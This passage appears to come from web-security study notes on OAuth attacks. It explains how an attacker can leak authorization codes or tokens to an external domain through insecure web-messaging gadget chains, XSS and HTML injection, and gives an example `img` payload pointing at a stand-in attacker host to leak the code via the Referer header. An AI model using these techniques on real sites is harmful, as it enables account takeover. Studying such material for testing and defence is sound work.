...
- In addition to open redirects, you should look for other vulns that allow you to extract the code or token and send it to an external domain. Some good examples include:
  - Dangerous JavaScript that handles query parameters and URL fragments: Insecure web messaging scripts. You may have to identify a longer gadget chain that allows you to pass the token through a series of scipts before eventually leaking it to your external domain.
  - Cross-site scripting: Although XSS can have a huge impact on its own, there is a small time frame in which the attacker has access to the user's session before they close the tab or navigate away. As the `HTTPOnly` attribute is commonly used for session cookies, an attacker will often also be unable to access them directly using XSS. However, by stealing the OAuth code or token, the attacker can gain access to the user's account in their own browser. This gives them much more time to explore the user's data and perform harmful actions.
  - HTML injection: In cases where you cannot inject JS, such as due to CSP constraints or strict filtering, you may still be able to use a simple HTML injection to steal authorization codes. In you can point the `redirect_uri` parameter to a page on which you can inject your own HTML content, you might be able to leak the code via the `Referer` header. For example, consider the following `img` element: `<img src="evil-user.net">`. When attempting to fetch this image, some browsers (such as Firefox) will send the full URL in the `Referer` header of the request, including the query string. 
